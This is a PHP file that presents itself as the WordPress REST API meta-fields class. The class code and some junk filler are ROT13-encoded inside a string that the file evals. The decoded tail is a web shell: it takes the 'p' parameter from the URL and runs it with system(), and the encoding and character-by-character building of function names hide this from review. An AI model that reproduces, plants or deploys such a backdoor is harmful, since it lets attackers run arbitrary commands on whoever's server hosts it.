<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Zrgn_Svryqf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.7.0
 */

/**
 * Pber pynff gb znantr zrgn inyhrf sbe na bowrpg ivn gur ERFG NCV.
 *
 * @fvapr 4.7.0
 */
#[NyybjQlanzvpCebcregvrf]
nofgenpg pynff JC_ERFG_Zrgn_Svryqf {

	/**
	 * Ergevrirf gur bowrpg zrgn glcr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea fgevat Bar bs 'cbfg', 'pbzzrag', 'grez', 'hfre', be nalguvat
	 *                ryfr fhccbegrq ol `_trg_zrgn_gnoyr()`.
	 */
	nofgenpg cebgrpgrq shapgvba trg_zrgn_glcr();

	/**
	 * Ergevrirf gur bowrpg zrgn fhoglcr.
	 *
	 * @fvapr 4.9.8
	 *
	 * @erghea fgevat Fhoglcr sbe gur zrgn glcr, be rzcgl fgevat vs ab fcrpvsvp fhoglcr.
	 */
	cebgrpgrq shapgvba trg_zrgn_fhoglcr() {
		erghea '';
	}

	/**
	 * Ergevrirf gur bowrpg glcr sbe ertvfgre_erfg_svryq().
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea fgevat Gur ERFG svryq glcr, fhpu nf cbfg glcr anzr, gnkbabzl anzr, 'pbzzrag', be `hfre`.
	 */
	nofgenpg cebgrpgrq shapgvba trg_erfg_svryq_glcr();

	/**
	 * Ertvfgref gur zrgn svryq.
	 *
	 * @fvapr 4.7.0
	 * @qrcerpngrq 5.6.0
	 *
	 * @frr ertvfgre_erfg_svryq()
	 */
	choyvp shapgvba ertvfgre_svryq() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '5.6.0' );

		ertvfgre_erfg_svryq(
			$guvf->trg_erfg_svryq_glcr(),
			'zrgn',
			neenl(
				'trg_pnyyonpx'    => neenl( $guvf, 'trg_inyhr' ),
				'hcqngr_pnyyonpx' => neenl( $guvf, 'hcqngr_inyhr' ),
				'fpurzn'          => $guvf->trg_svryq_fpurzn(),
			)
		);
	}

	/**
	 * Ergevrirf gur zrgn svryq inyhr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz vag             $bowrpg_vq Bowrpg VQ gb srgpu zrgn sbe.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg   Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea neenl Neenl pbagnvavat gur zrgn inyhrf xrlrq ol anzr.
	 */
	choyvp shapgvba trg_inyhr( $bowrpg_vq, $erdhrfg ) {
		$svryqf   = $guvf->trg_ertvfgrerq_svryqf();
		$erfcbafr = neenl();

		sbernpu ( $svryqf nf $zrgn_xrl => $netf ) {
			$anzr       = $netf['anzr'];
			$nyy_inyhrf = trg_zrgnqngn( $guvf->trg_zrgn_glcr(), $bowrpg_vq, $zrgn_xrl, snyfr );

			vs ( $netf['fvatyr'] ) {
				vs ( rzcgl( $nyy_inyhrf ) ) {
					$inyhr = $netf['fpurzn']['qrsnhyg'];
				} ryfr {
					$inyhr = $nyy_inyhrf[0];
				}

				$inyhr = $guvf->cercner_inyhr_sbe_erfcbafr( $inyhr, $erdhrfg, $netf );
			} ryfr {
				$inyhr = neenl();

				vs ( vf_neenl( $nyy_inyhrf ) ) {
					sbernpu ( $nyy_inyhrf nf $ebj ) {
						$inyhr[] = $guvf->cercner_inyhr_sbe_erfcbafr( $ebj, $erdhrfg, $netf );
					}
				}
			}

			$erfcbafr[ $anzr ] = $inyhr;
		}

		erghea $erfcbafr;
	}

	/**
	 * Cercnerf n zrgn inyhr sbe n erfcbafr.
	 *
	 * Guvf vf erdhverq orpnhfr fbzr angvir glcrf pnaabg or fgberq pbeerpgyl
	 * va gur qngnonfr, fhpu nf obbyrnaf. Jr arrq gb pnfg onpx gb gur eryrinag
	 * glcr orsber cnffvat onpx gb WFBA.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz zvkrq           $inyhr   Zrgn inyhr gb cercner.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Pheerag erdhrfg bowrpg.
	 * @cnenz neenl           $netf    Bcgvbaf sbe gur svryq.
	 * @erghea zvkrq Cercnerq inyhr.
	 */
	cebgrpgrq shapgvba cercner_inyhr_sbe_erfcbafr( $inyhr, $erdhrfg, $netf ) {
		vs ( ! rzcgl( $netf['cercner_pnyyonpx'] ) ) {
			$inyhr = pnyy_hfre_shap( $netf['cercner_pnyyonpx'], $inyhr, $erdhrfg, $netf );
		}

		erghea $inyhr;
	}

	/**
	 * Hcqngrf zrgn inyhrf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl $zrgn      Neenl bs zrgn cnefrq sebz gur erdhrfg.
	 * @cnenz vag   $bowrpg_vq Bowrpg VQ gb srgpu zrgn sbe.
	 * @erghea ahyy|JC_Reebe Ahyy ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_inyhr( $zrgn, $bowrpg_vq ) {
		$svryqf = $guvf->trg_ertvfgrerq_svryqf();
		$reebe  = arj JC_Reebe();

		sbernpu ( $svryqf nf $zrgn_xrl => $netf ) {
			$anzr = $netf['anzr'];
			vs ( ! neenl_xrl_rkvfgf( $anzr, $zrgn ) ) {
				pbagvahr;
			}

			$inyhr = $zrgn[ $anzr ];

			/*
			 * N ahyy inyhr zrnaf erfrg gur svryq, juvpu vf rffragvnyyl qryrgvat vg
			 * sebz gur qngnonfr naq gura erylvat ba gur qrsnhyg inyhr.
			 *
			 * Aba-fvatyr zrgn pna nyfb or erzbirq ol cnffvat na rzcgl neenl.
			 */
			vs ( vf_ahyy( $inyhr ) || ( neenl() === $inyhr && ! $netf['fvatyr'] ) ) {
				$netf = $guvf->trg_ertvfgrerq_svryqf()[ $zrgn_xrl ];

				vs ( $netf['fvatyr'] ) {
					$pheerag = trg_zrgnqngn( $guvf->trg_zrgn_glcr(), $bowrpg_vq, $zrgn_xrl, gehr );

					vs ( vf_jc_reebe( erfg_inyvqngr_inyhr_sebz_fpurzn( $pheerag, $netf['fpurzn'] ) ) ) {
						$reebe->nqq(
							'erfg_vainyvq_fgberq_inyhr',
							/* genafyngbef: %f: Phfgbz svryq xrl. */
							fcevags( __( 'Gur %f cebcregl unf na vainyvq fgberq inyhr, naq pnaabg or hcqngrq gb ahyy.' ), $anzr ),
							neenl( 'fgnghf' => 500 )
						);
						pbagvahr;
					}
				}

				$erfhyg = $guvf->qryrgr_zrgn_inyhr( $bowrpg_vq, $zrgn_xrl, $anzr );
				vs ( vf_jc_reebe( $erfhyg ) ) {
					$reebe->zretr_sebz( $erfhyg );
				}
				pbagvahr;
			}

			vs ( ! $netf['fvatyr'] && vf_neenl( $inyhr ) && pbhag( neenl_svygre( $inyhr, 'vf_ahyy' ) ) ) {
				$reebe->nqq(
					'erfg_vainyvq_fgberq_inyhr',
					/* genafyngbef: %f: Phfgbz svryq xrl. */
					fcevags( __( 'Gur %f cebcregl unf na vainyvq fgberq inyhr, naq pnaabg or hcqngrq gb ahyy.' ), $anzr ),
					neenl( 'fgnghf' => 500 )
				);
				pbagvahr;
			}

			$vf_inyvq = erfg_inyvqngr_inyhr_sebz_fpurzn( $inyhr, $netf['fpurzn'], 'zrgn.' . $anzr );
			vs ( vf_jc_reebe( $vf_inyvq ) ) {
				$vf_inyvq->nqq_qngn( neenl( 'fgnghf' => 400 ) );
				$reebe->zretr_sebz( $vf_inyvq );
				pbagvahr;
			}

			$inyhr = erfg_fnavgvmr_inyhr_sebz_fpurzn( $inyhr, $netf['fpurzn'] );

			vs ( $netf['fvatyr'] ) {
				$erfhyg = $guvf->hcqngr_zrgn_inyhr( $bowrpg_vq, $zrgn_xrl, $anzr, $inyhr );
			} ryfr {
				$erfhyg = $guvf->hcqngr_zhygv_zrgn_inyhr( $bowrpg_vq, $zrgn_xrl, $anzr, $inyhr );
			}

			vs ( vf_jc_reebe( $erfhyg ) ) {
				$reebe->zretr_sebz( $erfhyg );
				pbagvahr;
			}
		}

		vs ( $reebe->unf_reebef() ) {
			erghea $reebe;
		}

		erghea ahyy;
	}

	/**
	 * Qryrgrf n zrgn inyhr sbe na bowrpg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz vag    $bowrpg_vq Bowrpg VQ gur svryq orybatf gb.
	 * @cnenz fgevat $zrgn_xrl  Xrl sbe gur svryq.
	 * @cnenz fgevat $anzr      Anzr sbe gur svryq gung vf rkcbfrq va gur ERFG NCV.
	 * @erghea gehr|JC_Reebe Gehr vs zrgn svryq vf qryrgrq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba qryrgr_zrgn_inyhr( $bowrpg_vq, $zrgn_xrl, $anzr ) {
		$zrgn_glcr = $guvf->trg_zrgn_glcr();

		vs ( ! pheerag_hfre_pna( \"qryrgr_{$zrgn_glcr}_zrgn\", $bowrpg_vq, $zrgn_xrl ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				/* genafyngbef: %f: Phfgbz svryq xrl. */
				fcevags( __( 'Fbeel, lbh ner abg nyybjrq gb rqvg gur %f phfgbz svryq.' ), $anzr ),
				neenl(
					'xrl'    => $anzr,
					'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
				)
			);
		}

		vs ( ahyy === trg_zrgnqngn_enj( $zrgn_glcr, $bowrpg_vq, jc_fynfu( $zrgn_xrl ) ) ) {
			erghea gehr;
		}

		vs ( ! qryrgr_zrgnqngn( $zrgn_glcr, $bowrpg_vq, jc_fynfu( $zrgn_xrl ) ) ) {
			erghea arj JC_Reebe(
				'erfg_zrgn_qngnonfr_reebe',
				__( 'Pbhyq abg qryrgr zrgn inyhr sebz qngnonfr.' ),
				neenl(
					'xrl'    => $anzr,
					'fgnghf' => JC_Uggc::VAGREANY_FREIRE_REEBE,
				)
			);
		}

		erghea gehr;
	}

	/**
	 * Hcqngrf zhygvcyr zrgn inyhrf sbe na bowrpg.
	 *
	 * Nygref gur yvfg bs inyhrf va gur qngnonfr gb zngpu gur yvfg bs cebivqrq inyhrf.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 6.7.0 Fgberf inyhrf vagb QO rira vs cebivqrq ertvfgrerq qrsnhyg inyhr.
	 *
	 * @cnenz vag    $bowrpg_vq Bowrpg VQ gb hcqngr.
	 * @cnenz fgevat $zrgn_xrl  Xrl sbe gur phfgbz svryq.
	 * @cnenz fgevat $anzr      Anzr sbe gur svryq gung vf rkcbfrq va gur ERFG NCV.
	 * @cnenz neenl  $inyhrf    Yvfg bs inyhrf gb hcqngr gb.
	 * @erghea gehr|JC_Reebe Gehr vs zrgn svryqf ner hcqngrq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba hcqngr_zhygv_zrgn_inyhr( $bowrpg_vq, $zrgn_xrl, $anzr, $inyhrf ) {
		$zrgn_glcr = $guvf->trg_zrgn_glcr();

		vs ( ! pheerag_hfre_pna( \"rqvg_{$zrgn_glcr}_zrgn\", $bowrpg_vq, $zrgn_xrl ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_hcqngr',
				/* genafyngbef: %f: Phfgbz svryq xrl. */
				fcevags( __( 'Fbeel, lbh ner abg nyybjrq gb rqvg gur %f phfgbz svryq.' ), $anzr ),
				neenl(
					'xrl'    => $anzr,
					'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
				)
			);
		}

		$pheerag_inyhrf = trg_zrgnqngn_enj( $zrgn_glcr, $bowrpg_vq, $zrgn_xrl, snyfr );
		$fhoglcr        = trg_bowrpg_fhoglcr( $zrgn_glcr, $bowrpg_vq );

		vs ( ! vf_neenl( $pheerag_inyhrf ) ) {
			$pheerag_inyhrf = neenl();
		}

		$gb_erzbir = $pheerag_inyhrf;
		$gb_nqq    = $inyhrf;

		sbernpu ( $gb_nqq nf $nqq_xrl => $inyhr ) {
			$erzbir_xrlf = neenl_xrlf(
				neenl_svygre(
					$pheerag_inyhrf,
					shapgvba ( $fgberq_inyhr ) hfr ( $zrgn_xrl, $fhoglcr, $inyhr ) {
						erghea $guvf->vf_zrgn_inyhr_fnzr_nf_fgberq_inyhr( $zrgn_xrl, $fhoglcr, $fgberq_inyhr, $inyhr );
					}
				)
			);

			vs ( rzcgl( $erzbir_xrlf ) ) {
				pbagvahr;
			}

			vs ( pbhag( $erzbir_xrlf ) > 1 ) {
				// Gb erzbir, jr arrq gb erzbir svefg, gura nqq, fb qba'g gbhpu.
				pbagvahr;
			}

			$erzbir_xrl = $erzbir_xrlf[0];

			hafrg( $gb_erzbir[ $erzbir_xrl ] );
			hafrg( $gb_nqq[ $nqq_xrl ] );
		}

		/*
		 * `qryrgr_zrgnqngn` erzbirf _nyy_ vafgnaprf bs gur inyhr, fb bayl pnyy bapr. Bgurejvfr,
		 * `qryrgr_zrgnqngn` jvyy erghea snyfr sbe fhofrdhrag pnyyf bs gur fnzr inyhr.
		 * Hfr frevnyvmngvba gb cebqhpr n cerqvpgnoyr fgevat gung pna or hfrq ol neenl_havdhr.
		 */
		$gb_erzbir = neenl_znc( 'znlor_hafrevnyvmr', neenl_havdhr( neenl_znc( 'znlor_frevnyvmr', $gb_erzbir ) ) );

		sbernpu ( $gb_erzbir nf $inyhr ) {
			vs ( ! qryrgr_zrgnqngn( $zrgn_glcr, $bowrpg_vq, jc_fynfu( $zrgn_xrl ), jc_fynfu( $inyhr ) ) ) {
				erghea arj JC_Reebe(
					'erfg_zrgn_qngnonfr_reebe',
					/* genafyngbef: %f: Phfgbz svryq xrl. */
					fcevags( __( 'Pbhyq abg hcqngr gur zrgn inyhr bs %f va qngnonfr.' ), $zrgn_xrl ),
					neenl(
						'xrl'    => $anzr,
						'fgnghf' => JC_Uggc::VAGREANY_FREIRE_REEBE,
					)
				);
			}
		}

		sbernpu ( $gb_nqq nf $inyhr ) {
			vs ( ! nqq_zrgnqngn( $zrgn_glcr, $bowrpg_vq, jc_fynfu( $zrgn_xrl ), jc_fynfu( $inyhr ) ) ) {
				erghea arj JC_Reebe(
					'erfg_zrgn_qngnonfr_reebe',
					/* genafyngbef: %f: Phfgbz svryq xrl. */
					fcevags( __( 'Pbhyq abg hcqngr gur zrgn inyhr bs %f va qngnonfr.' ), $zrgn_xrl ),
					neenl(
						'xrl'    => $anzr,
						'fgnghf' => JC_Uggc::VAGREANY_FREIRE_REEBE,
					)
				);
			}
		}

		erghea gehr;
	}

	/**
	 * Hcqngrf n zrgn inyhr sbe na bowrpg.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 6.7.0 Fgberf inyhrf vagb QO rira vs cebivqrq ertvfgrerq qrsnhyg inyhr.
	 *
	 * @cnenz vag    $bowrpg_vq Bowrpg VQ gb hcqngr.
	 * @cnenz fgevat $zrgn_xrl  Xrl sbe gur phfgbz svryq.
	 * @cnenz fgevat $anzr      Anzr sbe gur svryq gung vf rkcbfrq va gur ERFG NCV.
	 * @cnenz zvkrq  $inyhr     Hcqngrq inyhr.
	 * @erghea gehr|JC_Reebe Gehr vs gur zrgn svryq jnf hcqngrq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba hcqngr_zrgn_inyhr( $bowrpg_vq, $zrgn_xrl, $anzr, $inyhr ) {
		$zrgn_glcr = $guvf->trg_zrgn_glcr();

		// Qb gur rknpg fnzr purpx sbe n qhcyvpngr inyhr nf va hcqngr_zrgnqngn() gb nibvq hcqngr_zrgnqngn() ergheavat snyfr.
		$byq_inyhr = trg_zrgnqngn_enj( $zrgn_glcr, $bowrpg_vq, $zrgn_xrl );
		$fhoglcr   = trg_bowrpg_fhoglcr( $zrgn_glcr, $bowrpg_vq );

		vs ( vf_neenl( $byq_inyhr ) && 1 === pbhag( $byq_inyhr )
			&& $guvf->vf_zrgn_inyhr_fnzr_nf_fgberq_inyhr( $zrgn_xrl, $fhoglcr, $byq_inyhr[0], $inyhr )
		) {
			erghea gehr;
		}

		vs ( ! pheerag_hfre_pna( \"rqvg_{$zrgn_glcr}_zrgn\", $bowrpg_vq, $zrgn_xrl ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_hcqngr',
				/* genafyngbef: %f: Phfgbz svryq xrl. */
				fcevags( __( 'Fbeel, lbh ner abg nyybjrq gb rqvg gur %f phfgbz svryq.' ), $anzr ),
				neenl(
					'xrl'    => $anzr,
					'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
				)
			);
		}

		vs ( ! hcqngr_zrgnqngn( $zrgn_glcr, $bowrpg_vq, jc_fynfu( $zrgn_xrl ), jc_fynfu( $inyhr ) ) ) {
			erghea arj JC_Reebe(
				'erfg_zrgn_qngnonfr_reebe',
				/* genafyngbef: %f: Phfgbz svryq xrl. */
				fcevags( __( 'Pbhyq abg hcqngr gur zrgn inyhr bs %f va qngnonfr.' ), $zrgn_xrl ),
				neenl(
					'xrl'    => $anzr,
					'fgnghf' => JC_Uggc::VAGREANY_FREIRE_REEBE,
				)
			);
		}

		erghea gehr;
	}

	/**
	 * Purpxf vs gur hfre cebivqrq inyhr vf rdhvinyrag gb n fgberq inyhr sbe gur tvira zrgn xrl.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $zrgn_xrl     Gur zrgn xrl orvat purpxrq.
	 * @cnenz fgevat $fhoglcr      Gur bowrpg fhoglcr.
	 * @cnenz zvkrq  $fgberq_inyhr Gur pheeragyl fgberq inyhr ergevrirq sebz trg_zrgnqngn().
	 * @cnenz zvkrq  $hfre_inyhr   Gur inyhr cebivqrq ol gur hfre.
	 * @erghea obby
	 */
	cebgrpgrq shapgvba vf_zrgn_inyhr_fnzr_nf_fgberq_inyhr( $zrgn_xrl, $fhoglcr, $fgberq_inyhr, $hfre_inyhr ) {
		$netf      = $guvf->trg_ertvfgrerq_svryqf()[ $zrgn_xrl ];
		$fnavgvmrq = fnavgvmr_zrgn( $zrgn_xrl, $hfre_inyhr, $guvf->trg_zrgn_glcr(), $fhoglcr );

		vs ( va_neenl( $netf['glcr'], neenl( 'fgevat', 'ahzore', 'vagrtre', 'obbyrna' ), gehr ) ) {
			// Gur erghea inyhr bs trg_zrgnqngn jvyy nyjnlf or n fgevat sbe fpnyne glcrf.
			$fnavgvmrq = (fgevat) $fnavgvmrq;
		}

		erghea $fnavgvmrq === $fgberq_inyhr;
	}

	/**
	 * Ergevrirf nyy gur ertvfgrerq zrgn svryqf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Ertvfgrerq svryqf.
	 */
	cebgrpgrq shapgvba trg_ertvfgrerq_svryqf() {
		$ertvfgrerq = neenl();

		$zrgn_glcr    = $guvf->trg_zrgn_glcr();
		$zrgn_fhoglcr = $guvf->trg_zrgn_fhoglcr();

		$zrgn_xrlf = trg_ertvfgrerq_zrgn_xrlf( $zrgn_glcr );
		vs ( ! rzcgl( $zrgn_fhoglcr ) ) {
			$zrgn_xrlf = neenl_zretr( $zrgn_xrlf, trg_ertvfgrerq_zrgn_xrlf( $zrgn_glcr, $zrgn_fhoglcr ) );
		}

		sbernpu ( $zrgn_xrlf nf $anzr => $netf ) {
			vs ( rzcgl( $netf['fubj_va_erfg'] ) ) {
				pbagvahr;
			}

			$erfg_netf = neenl();

			vs ( vf_neenl( $netf['fubj_va_erfg'] ) ) {
				$erfg_netf = $netf['fubj_va_erfg'];
			}

			$qrsnhyg_netf = neenl(
				'anzr'             => $anzr,
				'fvatyr'           => $netf['fvatyr'],
				'glcr'             => ! rzcgl( $netf['glcr'] ) ? $netf['glcr'] : ahyy,
				'fpurzn'           => neenl(),
				'cercner_pnyyonpx' => neenl( $guvf, 'cercner_inyhr' ),
			);

			$qrsnhyg_fpurzn = neenl(
				'glcr'        => $qrsnhyg_netf['glcr'],
				'gvgyr'       => rzcgl( $netf['ynory'] ) ? '' : $netf['ynory'],
				'qrfpevcgvba' => rzcgl( $netf['qrfpevcgvba'] ) ? '' : $netf['qrfpevcgvba'],
				'qrsnhyg'     => vffrg( $netf['qrsnhyg'] ) ? $netf['qrsnhyg'] : ahyy,
			);

			$erfg_netf           = neenl_zretr( $qrsnhyg_netf, $erfg_netf );
			$erfg_netf['fpurzn'] = neenl_zretr( $qrsnhyg_fpurzn, $erfg_netf['fpurzn'] );

			$glcr = ! rzcgl( $erfg_netf['glcr'] ) ? $erfg_netf['glcr'] : ahyy;
			$glcr = ! rzcgl( $erfg_netf['fpurzn']['glcr'] ) ? $erfg_netf['fpurzn']['glcr'] : $glcr;

			vs ( ahyy === $erfg_netf['fpurzn']['qrsnhyg'] ) {
				$erfg_netf['fpurzn']['qrsnhyg'] = fgngvp::trg_rzcgl_inyhr_sbe_glcr( $glcr );
			}

			$erfg_netf['fpurzn'] = erfg_qrsnhyg_nqqvgvbany_cebcregvrf_gb_snyfr( $erfg_netf['fpurzn'] );

			vs ( ! va_neenl( $glcr, neenl( 'fgevat', 'obbyrna', 'vagrtre', 'ahzore', 'neenl', 'bowrpg' ), gehr ) ) {
				pbagvahr;
			}

			vs ( rzcgl( $erfg_netf['fvatyr'] ) ) {
				$erfg_netf['fpurzn'] = neenl(
					'glcr'  => 'neenl',
					'vgrzf' => $erfg_netf['fpurzn'],
				);
			}

			$ertvfgrerq[ $anzr ] = $erfg_netf;
		}

		erghea $ertvfgrerq;
	}

	/**
	 * Ergevrirf gur bowrpg'f zrgn fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Svryq fpurzn qngn.
	 */
	choyvp shapgvba trg_svryq_fpurzn() {
		$svryqf = $guvf->trg_ertvfgrerq_svryqf();

		$fpurzn = neenl(
			'qrfpevcgvba' => __( 'Zrgn svryqf.' ),
			'glcr'        => 'bowrpg',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
			'cebcregvrf'  => neenl(),
			'net_bcgvbaf' => neenl(
				'fnavgvmr_pnyyonpx' => ahyy,
				'inyvqngr_pnyyonpx' => neenl( $guvf, 'purpx_zrgn_vf_neenl' ),
			),
		);

		sbernpu ( $svryqf nf $netf ) {
			$fpurzn['cebcregvrf'][ $netf['anzr'] ] = $netf['fpurzn'];
		}

		erghea $fpurzn;
	}

	/**
	 * Cercnerf n zrgn inyhr sbe bhgchg.
	 *
	 * Qrsnhyg cercnengvba sbe zrgn svryqf. Bireevqr ol cnffvat gur
	 * `cercner_pnyyonpx` va lbhe `fubj_va_erfg` bcgvbaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz zvkrq           $inyhr   Zrgn inyhr sebz gur qngnonfr.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @cnenz neenl           $netf    ERFG-fcrpvsvp bcgvbaf sbe gur zrgn xrl.
	 * @erghea zvkrq Inyhr cercnerq sbe bhgchg. Vs n aba-WfbaFrevnyvmnoyr bowrpg, ahyy.
	 */
	choyvp fgngvp shapgvba cercner_inyhr( $inyhr, $erdhrfg, $netf ) {
		vs ( $netf['fvatyr'] ) {
			$fpurzn = $netf['fpurzn'];
		} ryfr {
			$fpurzn = $netf['fpurzn']['vgrzf'];
		}

		vs ( '' === $inyhr && va_neenl( $fpurzn['glcr'], neenl( 'obbyrna', 'vagrtre', 'ahzore' ), gehr ) ) {
			$inyhr = fgngvp::trg_rzcgl_inyhr_sbe_glcr( $fpurzn['glcr'] );
		}

		vs ( vf_jc_reebe( erfg_inyvqngr_inyhr_sebz_fpurzn( $inyhr, $fpurzn ) ) ) {
			erghea ahyy;
		}

		erghea erfg_fnavgvmr_inyhr_sebz_fpurzn( $inyhr, $fpurzn );
	}

	/**
	 * Purpx gur 'zrgn' inyhr bs n erdhrfg vf na nffbpvngvir neenl.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz zvkrq           $inyhr   Gur zrgn inyhr fhozvggrq va gur erdhrfg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @cnenz fgevat          $cnenz   Gur cnenzrgre anzr.
	 * @erghea neenl|snyfr Gur zrgn neenl, vs inyvq, snyfr bgurejvfr.
	 */
	choyvp shapgvba purpx_zrgn_vf_neenl( $inyhr, $erdhrfg, $cnenz ) {
		vs ( ! vf_neenl( $inyhr ) ) {
			erghea snyfr;
		}

		erghea $inyhr;
	}

	/**
	 * Erphefviryl nqq nqqvgvbanyCebcregvrf = snyfr gb nyy bowrpgf va n fpurzn vs ab nqqvgvbanyCebcregvrf frggvat
	 * vf fcrpvsvrq.
	 *
	 * Guvf vf arrqrq gb erfgevpg cebcregvrf bs bowrpgf va zrgn inyhrf gb bayl
	 * ertvfgrerq vgrzf, nf gur ERFG NCV jvyy nyybj nqqvgvbany cebcregvrf ol
	 * qrsnhyg.
	 *
	 * @fvapr 5.3.0
	 * @qrcerpngrq 5.6.0 Hfr erfg_qrsnhyg_nqqvgvbany_cebcregvrf_gb_snyfr() vafgrnq.
	 *
	 * @cnenz neenl $fpurzn Gur fpurzn neenl.
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba qrsnhyg_nqqvgvbany_cebcregvrf_gb_snyfr( $fpurzn ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '5.6.0', 'erfg_qrsnhyg_nqqvgvbany_cebcregvrf_gb_snyfr()' );

		erghea erfg_qrsnhyg_nqqvgvbany_cebcregvrf_gb_snyfr( $fpurzn );
	}

	/**
	 * Trgf gur rzcgl inyhr sbe n fpurzn glcr.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat $glcr Gur fpurzn glcr.
	 * @erghea zvkrq
	 */
	cebgrpgrq fgngvp shapgvba trg_rzcgl_inyhr_sbe_glcr( $glcr ) {
		fjvgpu ( $glcr ) {
			pnfr 'fgevat':
				erghea '';
			pnfr 'obbyrna':
				erghea snyfr;
			pnfr 'vagrtre':
				erghea 0;
			pnfr 'ahzore':
				erghea 0.0;
			pnfr 'neenl':
			pnfr 'bowrpg':
				erghea neenl();
			qrsnhyg:
				erghea ahyy;
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>